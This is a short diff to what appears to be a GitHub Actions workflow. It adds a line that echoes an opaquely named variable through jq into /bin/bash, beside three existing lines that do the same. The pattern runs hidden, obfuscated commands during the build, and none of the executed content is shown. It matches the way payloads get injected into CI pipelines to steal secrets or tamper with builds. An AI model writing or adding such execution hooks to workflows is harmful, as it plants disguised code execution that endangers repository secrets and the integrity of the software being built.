@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$v82" | jq -r .ahn04 | /bin/bash
           printf '%s' "$nmhs8" | jq -r .tne4769 | /bin/bash
           printf '%s' "$sw07632" | jq -r .jttge7218 | /bin/bash
+          echo $zlplw04 | jq -r .dlkn9 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
